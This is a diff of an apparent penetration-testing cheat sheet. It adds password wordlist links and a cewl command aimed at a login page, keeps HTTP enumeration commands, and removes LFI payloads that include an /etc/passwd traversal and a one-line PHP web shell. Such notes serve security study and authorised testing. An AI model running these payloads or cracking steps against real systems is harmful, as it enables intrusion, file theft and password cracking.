@@ -1,3 +1,15 @@
+https://github.com/orwagodfather
+
+https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
+
+https://wordlists.assetnote.io/
+
+https://github.com/danielmiessler/SecLists/tree/master/Passwords
+
+cewl -d 3 -m 3 -v -w custom-wordlist.txt https://zzz.zzz/login
+
+
+
 HTTP Enumeration
 ----------------------------------------------
 # Gobuster
@@ -13,11 +25,7 @@ nıkto -h <targetip>
 curl -v -X OPTIONS http://<targetip>/test/
 curl --upload-file <file name> -v --url <url> -0 --http1.0
 ----------------------------------------------
-# LFI
-# PHP Wrapper
-php://filter/convert.base64-encode/resource=index.php
-# Null Byte
-?page=../../../../../../etc/passwd%00
+
 ----------------------------------------------
 
 # RFI
@@ -30,13 +38,6 @@ php://filter/convert.base64-encode/resource=index.php
 
 ---------------------------------------------
 
-# LFI and RCE
-
-# Inject code execution
-<?php echo system($_REQUEST["cmd"]);?>
-
-# Go to LFI vuln and
-?=…….&cmd=ls
 
 
 ----------------------------------------------
